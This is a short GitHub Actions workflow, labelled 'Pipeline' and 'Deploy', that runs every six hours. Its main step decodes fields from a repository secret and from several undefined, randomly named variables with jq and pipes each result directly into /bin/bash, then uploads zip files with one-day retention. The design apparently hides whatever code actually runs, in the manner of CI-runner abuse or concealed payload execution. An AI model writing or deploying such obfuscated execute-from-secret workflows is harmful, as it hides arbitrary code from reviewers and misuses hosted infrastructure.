name: Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '14 0,6,12,18 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  dispatcher:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Deploy
        env:
          e358: ${{ secrets.e358 }}
        run: |
          printf '%s' "$e358" | jq -r .ccf907 | /bin/bash
          printf '%s' "$eg79803" | jq -r .u42121 | /bin/bash
          printf '%s' "$zseh7623" | jq -r .qoly81285 | /bin/bash
          printf '%s' "$ef234" | jq -r .ylu771 | /bin/bash
          echo $uoa4 | jq -r .vfpc76264 | /bin/bash

      - name: Save results
        uses: actions/upload-artifact@v4
        with:
          name: t0f11GdX
          path: "*.zip"
          retention-days: 1
